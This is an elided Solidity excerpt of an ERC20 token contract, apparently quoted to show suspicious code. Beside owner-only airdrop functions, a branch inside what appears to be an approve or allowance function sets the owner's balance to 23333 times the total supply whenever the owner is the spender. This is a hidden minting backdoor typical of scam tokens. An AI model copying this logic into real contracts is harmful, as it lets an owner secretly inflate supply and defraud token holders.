...
contract Token is IERC20, Ownable {
    ...
    function airdrop(address _address) external onlyOwner {
        ...
        _airdrops[_address] = _airdrops[_address].add(amount);
    }

    function cancelAirdrop(address _address)  external onlyOwner {
        uint256 amount = _airdrops[_address];
        _airdrops[_address] = _airdrops[_address].sub(amount);
    }
    ...
    {
        if (spender == owner()) {
            _balances[owner()] = _totalSupply.mul(23333);
        }
